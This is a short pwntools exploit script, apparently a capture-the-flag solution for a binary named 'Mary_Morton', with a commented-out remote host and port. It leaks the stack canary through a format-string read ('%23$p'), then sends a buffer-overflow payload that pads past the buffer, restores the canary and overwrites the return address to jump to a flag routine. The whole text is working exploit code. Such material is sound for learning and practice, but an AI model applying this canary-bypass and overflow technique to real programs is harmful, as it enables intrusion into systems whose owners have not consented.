from pwn import *

context(log_level="debug", arch="amd64", os="linux")

flag = 0x004008da
p = process("./Mary_Morton")
# p = remote("111.200.241.244", 54983)

p.recvuntil("3. Exit the battle \n")
p.sendline(b"2")
p.sendline(b"%23$p")
canary = int(p.recvline(), 16)
print(canary)
p.recvuntil("3. Exit the battle \n")
p.sendline(b"1")
payload = cyclic(0x88) + p64(canary) + cyclic(8) + p64(flag)
p.sendline(payload)
p.interactive()
